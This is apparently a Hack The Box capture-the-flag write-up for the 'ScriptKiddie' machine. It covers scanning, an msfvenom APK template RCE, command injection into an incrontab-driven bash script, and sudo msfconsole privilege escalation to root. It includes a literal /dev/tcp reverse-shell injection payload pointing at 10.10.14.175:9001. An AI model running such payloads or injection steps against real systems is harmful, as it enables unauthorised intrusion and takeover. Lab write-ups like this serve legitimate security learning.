# ScriptKiddie

## nmap -sC -sV -oA scriptkiddie.nmap scriptkiddie.htb

Result of scan can be found [here][1]

At first look the web site seems a simple html site in which there are some "hacker tools" 

The webserver is a Werkzeug 0.16.1 Python server 

## Burpsuite

Analyze the request and changing the action to `exec` via Burpsuite the server seems do an echo of what we sent.

## Exploit Metasploit °L°

Searching for some exploit for one of the options in the site, seems that `venom` has an [RCE vulnerability][2] with apk templates.

Using Metasploit we can build a template to inject some command like a reverse shell and get the user flag from kid

Use `ssh-keygen` to create a new rsa keys pairs to get a stable ssh connection to `kid`

## linpeas

[Linpeas scan result][3]

Looking at linpeas result seems that there is another user `pwn`

Inside `pwn` home there is a script `scanlosers.sh` that is probably executed every time `/home/kid/logs/hackers` is modified via `incrontab`

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

We can try to broke the pipe to inject a reverse shell
`   ; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.175/9001 0>&1";` will broke the pipe 

## pwn'ed

The user `pwn` can run via sudo metasploit without using password.

`sudo /opt/metasploit-framework-6.0.9/msfconsole` and then run `bash` inside msfconsole to get a root shell.

![htbbadge](https://www.hackthebox.eu/badge/image/272787)

[//]: #links
[1]: scriptkiddie.nmap
[2]: https://www.exploit-db.com/exploits/49491
[3]: lin.txt
